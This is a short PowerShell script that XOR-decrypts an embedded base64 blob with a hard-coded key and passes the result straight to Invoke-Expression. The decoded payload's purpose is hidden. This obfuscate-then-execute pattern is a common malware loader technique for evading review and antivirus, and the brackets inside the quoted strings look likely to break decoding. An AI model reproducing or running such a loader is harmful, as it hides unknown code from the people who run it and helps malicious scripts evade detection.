function Decrypt-String {
    param (
        [string]$EncryptedString,
        [string]$Key
    )
    $encryptedBytes = [Convert]::FromBase64String($EncryptedString)
    $decryptedChars = @()
    for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {

        $decryptedChars += [char]($encryptedBytes[$i] -bxor [byte][char]$Key[$i % $Key.Length])
    }
    return -join $decryptedChars
}

$encryptedScript = "[ShVSWFMvIxosBwAMXConcSATGwoxX1ctCh8HGhoVS3sWCxdINy0SIF5PRQkLCRgMABAAWhUbOlRMWlIqBikfGQpPPgAeGigXERsbFENyJhcIUkQAKwQCHFhDSh8PElwCGgAYFj0GFgQAAAcxBBcBFkIGAgNKJwgRBhUPMxI2CR0UWXA+Fx0HHxE9LUoAABUHXws6EgESXQ4JNh5dCgwIEwQcEAFLFgwVRH9eKhQGJQEzFVJLEldFPhoEABFeJAIMPBYWElJHGA==]" 

$key = "[nerestpc_search_problem]"

$decryptedScript = Decrypt-String -EncryptedString $encryptedScript -Key $key
Invoke-Expression $decryptedScript
